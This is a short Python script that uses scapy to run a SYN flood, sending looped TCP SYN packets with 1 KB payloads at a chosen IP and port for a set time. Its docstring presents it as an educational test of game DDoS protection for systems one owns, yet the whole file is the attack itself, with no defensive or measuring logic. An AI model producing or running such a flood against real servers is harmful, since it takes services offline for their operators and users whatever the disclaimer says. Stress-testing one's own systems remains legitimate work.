#!/usr/bin/env python3
"""
Port Flooding Test Script

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""
# This requires: pip install scapy
from scapy.all import *

def syn_flood(target_ip, port, duration):
    """Send SYN packets without completing handshake."""
    end_time = time.time() + duration
    
    # Forge IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw = Raw(b"X"*1024)  # Add payload
    packet = ip / tcp / raw
    
    print(f"Starting SYN flood to {target_ip}:{port}")
    send(packet, loop=1, verbose=0, inter=0.01, count=int(duration/0.01))
    print(f"Completed SYN flood to {target_ip}:{port}")
